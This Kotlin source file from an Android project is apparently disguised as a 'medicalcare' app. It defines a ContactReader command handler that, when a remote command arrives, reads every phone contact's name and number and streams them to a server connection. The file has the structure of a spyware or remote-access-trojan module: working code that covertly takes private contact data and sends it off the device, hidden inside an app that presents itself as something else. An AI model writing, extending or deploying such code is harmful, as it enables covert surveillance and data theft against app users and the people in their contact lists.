package com.example.medicalcare.features.network.commands

import android.content.Context
import android.provider.ContactsContract
import java.io.DataOutputStream

class ContactReader(private val context: Context) : CommandHandler {
    override fun handle(command: String, toServer: DataOutputStream) {
        val resolver = context.contentResolver
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        toServer.write("-----------Contacts List-----------\n".toByteArray())

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val number = it.getString(numberIndex)
                val entry = "Name: $name | Phone: $number\n"
                toServer.write(entry.toByteArray())
            }
        }

        toServer.write("----------End of Contacts----------\n".toByteArray())
        toServer.flush()
    }
}